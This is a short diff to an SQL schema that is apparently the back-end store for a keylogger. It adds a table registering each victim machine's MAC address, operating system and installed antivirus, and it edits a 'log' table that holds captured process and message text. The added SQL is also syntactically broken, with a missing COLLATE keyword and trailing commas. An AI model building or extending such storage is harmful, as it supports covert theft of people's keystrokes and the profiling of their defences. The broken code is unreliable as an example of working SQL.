@@ -1,7 +1,12 @@
-CREATE DATABASE `keylogger`;
+CREATE TABLE `register` (
 
--- DROP TABLE IF EXISTS `comment`;
+  `mac` varchar(255) utf8_unicode_ci,
 
+  `os` varchar(255) DEFAULT NULL,
+
+  `antivirus` varchar(255) DEFAULT NULL,
+
+);
 
 CREATE TABLE `log` (
 
@@ -11,8 +16,8 @@ CREATE TABLE `log` (
 
   `time` timestamp DEFAULT NULL,
 
-  `proccess` varchar(255) DEFAULT NULL,
+  `process` varchar(255) DEFAULT NULL,
 
   `message` longtext DEFAULT NULL,
 
-  ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
+  );
